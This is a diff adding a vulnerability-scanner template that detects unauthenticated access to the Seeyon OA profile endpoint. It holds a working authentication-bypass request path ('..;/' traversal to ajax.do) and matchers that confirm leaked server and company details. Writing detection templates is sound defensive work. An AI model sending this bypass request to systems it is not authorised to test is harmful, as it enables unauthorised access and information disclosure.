@@ -1,0 +1,30 @@
+id: seeyon-unauthorized-profile
+
+info:
+  name: Seeyon Unauthorized OA Profile Access
+  author: local
+  severity: low
+  description: Detects unauthenticated access to the Seeyon OA profile endpoint.
+  tags: seeyon,zhiyuan,unauthorized,disclosure
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/seeyon/personalBind.do.jpg/..;/ajax.do?method=ajaxAction&managerName=mMOneProfileManager&managerMethod=getOAProfile"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - 'application/json'
+        case-insensitive: true
+      - type: word
+        part: body
+        words:
+          - 'serverIdentifier'
+          - 'companyName'
+        condition: and
+
